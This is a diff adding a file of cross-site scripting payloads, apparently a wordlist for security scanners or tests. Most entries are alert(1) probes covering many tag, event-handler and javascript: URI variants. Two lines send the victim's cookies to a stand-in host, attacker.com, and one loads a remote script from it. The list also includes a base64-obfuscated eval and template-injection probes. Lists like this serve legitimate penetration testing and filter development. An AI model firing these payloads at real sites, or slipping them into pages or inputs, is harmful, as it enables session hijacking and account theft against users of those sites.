@@ -1,0 +1,45 @@
+# Cross-Site Scripting (XSS) Pattern Payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<input autofocus onfocus=alert(1)>
+<a href="javascript:alert(1)">Click</a>
+<script>document.location='http://attacker.com/cookie?c='+document.cookie</script>
+<script>fetch('http://attacker.com/log?cookie='+document.cookie)</script>
+<details open ontoggle=alert(1)>
+<audio src=x onerror=alert(1)>
+<video><source onerror=alert(1)></video>
+<marquee onstart=alert(1)>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+"><script>alert(1)</script>
+'></script><script>alert(1)</script>
+<script src="http://attacker.com/xss.js"></script>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">Click</maction></math>
+<table background="javascript:alert(1)"></table>
+<isindex type=image src=1 onerror=alert(1)>
+<base href="javascript:alert(1)//">
+<form><button formaction=javascript:alert(1)>Click</button></form>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+<body onload=alert(1)>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onchange=alert(1)><option>1</option></select>
+{{7*7}}
+${7*7}
+#{7*7}
+
